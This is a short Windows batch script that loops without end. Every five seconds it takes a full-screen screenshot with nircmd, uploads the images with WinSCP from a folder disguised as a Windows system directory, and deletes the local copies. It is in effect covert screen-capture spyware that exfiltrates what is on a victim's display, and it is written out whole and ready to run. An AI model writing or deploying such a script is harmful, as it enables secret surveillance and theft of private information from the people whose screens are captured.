@echo off
:start
SET HOUR=%time:~0,2%
SET dtStamp9=%date:~-4%%date:~4,2%%date:~7,2%_0%time:~1,1%%time:~3,2%%time:~6,2% 
SET dtStamp24=%date:~-4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%
if "%HOUR:~0,1%" == " " (SET dtStamp=%dtStamp9%) else (SET dtStamp=%dtStamp24%)
mkdir ss
nircmd.exe savescreenshotfull ss\%dtStamp%.png
C:\Windows\System\Text\r\3\WinSCP.com /script=C:\Windows\System\Text\r\3\ss1.bat
del /f/q C:\Windows\System\Text\r\3\ss
timeout 5
goto start
